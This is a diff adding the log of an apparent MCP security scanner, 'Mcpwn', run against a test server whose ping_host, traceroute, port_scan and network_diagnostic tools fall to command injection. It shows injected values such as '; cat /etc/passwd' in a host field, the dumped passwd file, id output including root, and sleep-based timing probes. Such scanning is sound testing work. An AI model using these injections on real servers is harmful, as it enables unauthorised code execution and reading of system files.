@@ -1,0 +1,362 @@
+[INFO] Starting Mcpwn
+[INFO] Testing state desync...
+[WARNING] State desync: {'type': 'STATE_RESET', 'detail': 'Server accepted double initialization', 'severity': 'MEDIUM', 'test': 'state_desync', 'timestamp': '2026-10-19T17:19:21.727907+00:00'}
+[INFO] Testing capability fuzzing...
+[WARNING] Capability issue: CAPABILITY_VALIDATION_BYPASS
+[WARNING] Capability issue: CAPABILITY_VALIDATION_BYPASS
+[WARNING] Capability issue: CAPABILITY_VALIDATION_BYPASS
+[WARNING] Capability issue: CAPABILITY_VALIDATION_BYPASS
+[WARNING] Capability issue: CAPABILITY_VALIDATION_BYPASS
+[WARNING] Capability issue: CAPABILITY_VALIDATION_BYPASS
+[WARNING] Capability issue: CAPABILITY_VALIDATION_BYPASS
+[WARNING] Capability issue: CAPABILITY_VALIDATION_BYPASS
+[WARNING] Capability issue: CAPABILITY_VALIDATION_BYPASS
+[WARNING] Capability issue: CAPABILITY_VALIDATION_BYPASS
+[INFO] Discovery phase...
+[INFO] Found 5 tools, 1 resources
+[INFO] Testing tool injection...
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=1001'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0075397491455078125}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=1001'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007962465286254883}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.008302688598632812}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007561445236206055}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006571531295776367}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.00789642333984375}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005979299545288086}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006188631057739258}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'Linux.*\\d+\\.\\d+\\.\\d+', 'match': 'Linux 971842f6bacf 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 GNU/Linux\\n"}],"structuredContent":{"result":"Ping result:\\n\\n/bin/sh: 1: ping: not found\\nLinux 971842f6bacf 6.18.54.1'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'GNU/Linux', 'match': 'GNU/Linux'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0068666934967041016}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'Linux.*\\d+\\.\\d+\\.\\d+', 'match': 'Linux 971842f6bacf 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 GNU/Linux\\n"}],"structuredContent":{"result":"Ping result:\\n\\n/bin/sh: 1: ping: not found\\nLinux 971842f6bacf 6.18.54.1'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'GNU/Linux', 'match': 'GNU/Linux'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006189584732055664}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006241321563720703}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005392789840698242}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.004653453826904297}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005360841751098633}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=1001'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006356000900268555}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005731344223022461}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'Linux.*\\d+\\.\\d+\\.\\d+', 'match': 'Linux 971842f6bacf 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 GNU/Linux\\n"}],"structuredContent":{"result":"Ping result:\\n\\n/bin/sh: 1: ping: not found\\nLinux 971842f6bacf 6.18.54.1'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'GNU/Linux', 'match': 'GNU/Linux'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006234407424926758}
+[WARNING] ping_host: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.00s
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.004786729812622}
+[WARNING] ping_host: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.008198022842407}
+[WARNING] ping_host: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.010014772415161}
+[WARNING] ping_host: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.005019187927246}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005682706832885742}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.004034757614135742}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'root:.*:0:0', 'match': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\\n"}],"structuredContent":{"result":"Ping result:\\n\\n/bin/sh: 1: ping: not found\\nroot:x:0:0'}
+[WARNING]   Detection: {'type': 'FILE_READ', 'indicator': 'root:x:', 'match': 'root:x:'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0058307647705078125}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'root:.*:0:0', 'match': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\\n"}],"structuredContent":{"result":"Ping result:\\n\\n/bin/sh: 1: ping: not found\\nroot:x:0:0'}
+[WARNING]   Detection: {'type': 'FILE_READ', 'indicator': 'root:x:', 'match': 'root:x:'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007847070693969727}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006995201110839844}
+[WARNING] ping_host: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0059130191802978516}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=1001'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007014274597167969}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=1001'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0073490142822265625}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007414102554321289}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.008322715759277344}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007582187652587891}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005897998809814453}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007172584533691406}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005731821060180664}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'Linux.*\\d+\\.\\d+\\.\\d+', 'match': 'Linux 971842f6bacf 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 GNU/Linux\\n"}],"structuredContent":{"result":"Traceroute result:\\n\\n/bin/sh: 1: traceroute: not found\\nLinux 971842f6bacf 6.18.54.1'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'GNU/Linux', 'match': 'GNU/Linux'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.00574183464050293}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'Linux.*\\d+\\.\\d+\\.\\d+', 'match': 'Linux 971842f6bacf 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 GNU/Linux\\n"}],"structuredContent":{"result":"Traceroute result:\\n\\n/bin/sh: 1: traceroute: not found\\nLinux 971842f6bacf 6.18.54.1'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'GNU/Linux', 'match': 'GNU/Linux'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006237983703613281}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006752490997314453}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0047588348388671875}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.004693746566772461}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.004326820373535156}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=1001'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0063474178314208984}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0056078433990478516}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'Linux.*\\d+\\.\\d+\\.\\d+', 'match': 'Linux 971842f6bacf 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 GNU/Linux\\n"}],"structuredContent":{"result":"Traceroute result:\\n\\n/bin/sh: 1: traceroute: not found\\nLinux 971842f6bacf 6.18.54.1'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'GNU/Linux', 'match': 'GNU/Linux'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005268096923828125}
+[WARNING] traceroute: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.006629943847656}
+[WARNING] traceroute: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.006442785263062}
+[WARNING] traceroute: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.009287118911743}
+[WARNING] traceroute: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.00860595703125}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005417346954345703}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.004203319549560547}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'root:.*:0:0', 'match': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\\n"}],"structuredContent":{"result":"Traceroute result:\\n\\n/bin/sh: 1: traceroute: not found\\nroot:x:0:0'}
+[WARNING]   Detection: {'type': 'FILE_READ', 'indicator': 'root:x:', 'match': 'root:x:'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005785703659057617}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'root:.*:0:0', 'match': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\\n"}],"structuredContent":{"result":"Traceroute result:\\n\\n/bin/sh: 1: traceroute: not found\\nroot:x:0:0'}
+[WARNING]   Detection: {'type': 'FILE_READ', 'indicator': 'root:x:', 'match': 'root:x:'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007280588150024414}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006917476654052734}
+[WARNING] traceroute: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007914543151855469}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=0(root)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=0(root)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=0'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006720781326293945}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=0(root)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=0(root)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=0'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006844997406005859}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007729291915893555}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007041454315185547}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006415605545043945}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.00778961181640625}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0077342987060546875}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006864786148071289}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007048606872558594}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007468700408935547}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0071752071380615234}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.003811359405517578}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.004471302032470703}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0043904781341552734}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=0(root)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=0(root)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=0'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.007098674774169922}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005329608917236328}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005330085754394531}
+[WARNING] port_scan: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.00s
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.003852844238281}
+[WARNING] port_scan: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.007339239120483}
+[WARNING] port_scan: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.008553504943848}
+[WARNING] port_scan: BLIND_RCE_TIMING via host
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.00585412979126}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.00875234603881836}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.003848552703857422}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'root:.*:0:0', 'match': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\\ncat: 0: No such file or directory\\n"}],"structuredContent":{"result":"Port scan result for ; cat /etc/passwd:0:\\n\\nStatus: closed\\n\\n/bin/sh: 1: nc: not found\\nroot:x:0:0'}
+[WARNING]   Detection: {'type': 'FILE_READ', 'indicator': 'root:x:', 'match': 'root:x:'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0054056644439697266}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'root:.*:0:0', 'match': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\\ncat: 0: No such file or directory\\n"}],"structuredContent":{"result":"Port scan result for | cat /etc/passwd:0:\\n\\nStatus: closed\\n\\n/bin/sh: 1: nc: not found\\nroot:x:0:0'}
+[WARNING]   Detection: {'type': 'FILE_READ', 'indicator': 'root:x:', 'match': 'root:x:'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.00595402717590332}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005693912506103516}
+[WARNING] port_scan: command_injection via host
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005419731140136719}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=1001'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006859779357910156}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=1001'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0075283050537109375}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0064966678619384766}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006802558898925781}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0068471431732177734}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0059549808502197266}
